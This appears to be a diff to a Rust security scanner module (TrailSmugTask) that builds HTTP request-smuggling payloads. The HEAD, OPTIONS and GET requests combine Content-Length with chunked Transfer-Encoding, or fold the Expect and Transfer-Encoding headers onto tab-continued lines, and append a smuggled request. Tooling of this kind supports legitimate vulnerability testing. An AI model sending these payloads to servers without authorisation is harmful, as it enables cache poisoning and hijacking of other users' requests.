@@ -127,6 +127,54 @@ impl TrailSmugTask {
             {smug}"
         ));
 
+        // payloads.push(format!(
+        //     "\
+        //     HEAD {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: keep-alive\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Content-Type: application/www-form-urlencoded\r\n\
+        //     a\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
+
+        // payloads.push(format!(
+        //     "\
+        //     OPTIONS {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Connection: keep-alive\r\n\
+        //     User-Agent: {HTTP_USER_AGENT}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Content-Type: application/www-form-urlencoded\r\n\
+        //     Expect:\r\n\t100-continue\r\n\
+        //     \r\n\
+        //     {smug}"
+        // ));
+
+        // payloads.push(format!("\
+        //     GET {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Transfer-Encoding: Chunked\r\n\
+        //     \r\n\
+        //     0\r\n\
+        //     \r\n\
+        //     {smug}
+        // "));
+
+        // payloads.push(format!("\
+        //     GET {path} HTTP/1.1\r\n\
+        //     Host: {authority}\r\n\
+        //     Content-Length: {len}\r\n\
+        //     Transfer-Encoding: Chunked\r\n\
+        //     \r\n\
+        //     0\r\n\
+        //     \r\n\
+        //     {smug}
+        // "));
+
         payloads.push(format!(
             "\
             HEAD {path} HTTP/1.1\r\n\
@@ -135,7 +183,7 @@ impl TrailSmugTask {
             User-Agent: {HTTP_USER_AGENT}\r\n\
             Content-Length: {len}\r\n\
             Content-Type: application/www-form-urlencoded\r\n\
-            a\r\n\
+            Expect:\r\n\t100-continue\r\n\
             \r\n\
             {smug}"
         ));
@@ -168,7 +216,7 @@ impl TrailSmugTask {
             GET {path} HTTP/1.1\r\n\
             Host: {authority}\r\n\
             Content-Length: {len}\r\n\
-            Transfer-Encoding: Chunked\r\n\
+            Transfer-Encoding:\r\n\tChunked\r\n\
             \r\n\
             0\r\n\
             \r\n\
